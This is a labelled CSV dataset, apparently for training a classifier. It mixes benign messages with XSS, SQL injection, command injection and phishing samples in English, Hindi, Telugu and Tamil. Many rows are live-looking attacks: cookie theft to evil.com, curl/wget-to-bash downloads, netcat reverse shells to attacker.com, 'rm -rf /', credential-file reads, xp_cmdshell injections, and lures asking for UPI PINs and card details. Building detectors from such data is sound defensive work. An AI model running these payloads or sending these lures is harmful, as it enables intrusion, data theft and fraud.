text,label
<svg onload=alert(document.cookie)>,XSS
You have been selected for a cashback offer. Enter your UPI PIN to claim: http://urgent-verify-now.co,PHISHING
; CHMOD 777 /ETC/SHADOW,COMMAND_INJECTION
$(curl http://evil.com/shell.sh | bash),COMMAND_INJECTION
"Dear customer, your KYC is pending. Complete it now or your account will be blocked: http://urgent-verify-now.co",PHISHING
Your OTP has expired. Re-enter your card details to continue: http://kyc-refresh.info,PHISHING
మీకు లక్కీ డ్రా లో 50000 రూపాయలు వచ్చాయి. ఇప్పుడే క్లెయిమ్ చేయండి: http://urgent-verify-now.co,PHISHING
URGENT: Your account will be locked in 24 hours. Update your password now: http://account-alert-service.xyz,PHISHING
' or 'a'='a,SQL_INJECTION
"आपका ओटीपी समाप्त हो गया है, कृपया कार्ड विवरण फिर से दर्ज करें: http://prize-claim24.com",PHISHING
"आपका केवाईसी लंबित है, अभी अपडेट करें वरना खाता ब्लॉक हो जाएगा: http://prize-claim24.com",PHISHING
1; drop table users;--,SQL_INJECTION
' OR 1=1--,SQL_INJECTION
&&/**/powershell/**/-enc/**/SGVsbG8=,COMMAND_INJECTION
<SCRIPT>FETCH('HTTP://EVIL.COM/'+DOCUMENT.COOKIE)</SCRIPT>,XSS
Your OTP has expired. Re-enter your card details to continue: http://prize-claim24.com,PHISHING
The server maintenance window is scheduled for Sunday 2 AM to 4 AM.,BENIGN
%27; EXEC xp_cmdshell(%27dir%27)--,SQL_INJECTION
; wget http://evil.com/malware.sh -O- | sh,COMMAND_INJECTION
Your parcel could not be delivered. Pay a small fee to reschedule: http://kyc-refresh.info,PHISHING
நாளை கூட்டத்தின் நேரத்தை தெரிவிக்கவும்.,BENIGN
"Congratulations! You have won a lottery of $10,000. Claim now at http://parcel-track-pay.com",PHISHING
आपका बैंक खाता निलंबित कर दिया गया है। तुरंत यहां क्लिक करके सत्यापित करें: http://account-alert-service.xyz,PHISHING
<div/**/onmouseover=alert('xss')>hover</div>,XSS
<div onmouseover=alert(%27xss%27)>hover</div>,XSS
; rm -rf /,COMMAND_INJECTION
`whoami`,COMMAND_INJECTION
"உங்கள் KYC நிலுவையில் உள்ளது, உடனடியாக புதுப்பிக்கவும்: http://account-alert-service.xyz",PHISHING
"आपका ऑर्डर सफलतापूर्वक डिलीवर हो गया है, धन्यवाद।",BENIGN
' UNION SELECT credit_card FROM payments--,SQL_INJECTION
Your subscription payment failed. Update billing info immediately: http://urgent-verify-now.co,PHISHING
'; INSERT INTO logs VALUES('x')--,SQL_INJECTION
What is the weather forecast for tomorrow in Hyderabad?,BENIGN
"మీ ఆర్డర్ విజయవంతంగా డెలివరీ చేయబడింది, ధన్యవాదాలు. मुझे अपने खाते की जानकारी अपडेट करनी है।",BENIGN
"आपका केवाईसी लंबित है, अभी अपडेट करें वरना खाता ब्लॉक हो जाएगा: http://parcel-track-pay.com",PHISHING
;/**//bin/bash/**/-c/**/'reverse_shell',COMMAND_INJECTION
Your parcel could not be delivered. Pay a small fee to reschedule: http://parcel-track-pay.com,PHISHING
$(nc/**/-e/**//bin/sh/**/attacker.com/**/1234),COMMAND_INJECTION
;/**/wget/**/http://evil.com/malware.sh/**/-O-/**/|/**/sh,COMMAND_INJECTION
The library is open until 8 PM on weekdays.,BENIGN
<script>alert('xss')</script>,XSS
The new product update includes several performance improvements. मुझे अपने खाते की जानकारी अपडेट करनी है।,BENIGN
Final notice: pay your pending electricity bill within 2 hours: http://account-alert-service.xyz,PHISHING
Your bank account has been suspended. Click here immediately to verify: http://account-alert-service.xyz,PHISHING
"The new product update includes several performance improvements. உங்கள் ஆர்டர் வெற்றிகரமாக டெலிவரி செய்யப்பட்டது, நன்றி.",BENIGN
'; exec xp_cmdshell('dir')--,SQL_INJECTION
|| CURL -S HTTP://EVIL.COM/BACKDOOR.SH | BASH,COMMAND_INJECTION
'; EXEC XP_CMDSHELL('DIR')--,SQL_INJECTION
javascript:alert('hacked'),XSS
"మీ ఆర్డర్ విజయవంతంగా డెలివరీ చేయబడింది, ధన్యవాదాలు. The library is open until 8 PM on weekdays.",BENIGN
Your parcel could not be delivered. Pay a small fee to reschedule: http://prize-claim24.com,PHISHING
"మీ OTP గడువు ముగిసింది, కార్డు వివరాలు మళ్ళీ నమోదు చేయండి: http://prize-claim24.com",PHISHING
%27 OR 1=1#,SQL_INJECTION
Your subscription payment failed. Update billing info immediately: http://kyc-refresh.info,PHISHING
';/**/EXEC/**/xp_cmdshell('dir')--,SQL_INJECTION
మీకు లక్కీ డ్రా లో 50000 రూపాయలు వచ్చాయి. ఇప్పుడే క్లెయిమ్ చేయండి: http://parcel-track-pay.com,PHISHING
Your bank account has been suspended. Click here immediately to verify: http://kyc-refresh.info,PHISHING
admin%27 OR %271%27=%271%27#,SQL_INJECTION
How do I reset my password from the account settings page?,BENIGN
' OR '1'='1,SQL_INJECTION
Your parcel could not be delivered. Pay a small fee to reschedule: http://fraud-verify.com,PHISHING
<iframe/**/src=javascript:alert(1)>,XSS
"మీ KYC పెండింగ్‌లో ఉంది, వెంటనే అప్‌డేట్ చేయకపోతే ఖాతా బ్లాక్ అవుతుంది: http://account-alert-service.xyz",PHISHING
|/**/nc/**/attacker.com/**/4444/**/-e/**//bin/bash,COMMAND_INJECTION
"మీ KYC పెండింగ్‌లో ఉంది, వెంటనే అప్‌డేట్ చేయకపోతే ఖాతా బ్లాక్ అవుతుంది: http://fraud-verify.com",PHISHING
&& CAT /ETC/PASSWD,COMMAND_INJECTION
"; python3 -c %27import os;os.system(""id"")%27",COMMAND_INJECTION
%27 waitfor delay %270:0:5%27--,SQL_INJECTION
"మీ KYC పెండింగ్‌లో ఉంది, వెంటనే అప్‌డేట్ చేయకపోతే ఖాతా బ్లాక్ అవుతుంది: http://prize-claim24.com",PHISHING
You have been selected for a cashback offer. Enter your UPI PIN to claim: http://secure-bank-update.net,PHISHING
आपका बैंक खाता निलंबित कर दिया गया है। तुरंत यहां क्लिक करके सत्यापित करें: http://kyc-refresh.info,PHISHING
&& POWERSHELL -ENC SGVSBG8=,COMMAND_INJECTION
आपका बैंक खाता निलंबित कर दिया गया है। तुरंत यहां क्लिक करके सत्यापित करें: http://parcel-track-pay.com,PHISHING
Your subscription payment failed. Update billing info immediately: http://fraud-verify.com,PHISHING
"உங்கள் ஆர்டர் வெற்றிகரமாக டெலிவரி செய்யப்பட்டது, நன்றி. The invoice for last month has been generated and sent to accounting.",BENIGN
<script>alert(%27xss%27)</script>,XSS
"உங்கள் ஆர்டர் வெற்றிகரமாக டெலிவரி செய்யப்பட்டது, நன்றி. I really enjoyed the movie we watched last weekend, the plot was great.",BENIGN
JAVASCRIPT:ALERT('HACKED'),XSS
"<svg/onload=alert(string.fromcharcode(88,83,83))>",XSS
"வாழ்த்துக்கள்! நீங்கள் 50,000 ரூபாய் பரிசு வென்றுள்ளீர்கள். இப்போது கோரவும்: http://parcel-track-pay.com",PHISHING
"1' UNION SELECT NULL,NULL,NULL--",SQL_INJECTION
Your OTP has expired. Re-enter your card details to continue: http://account-alert-service.xyz,PHISHING
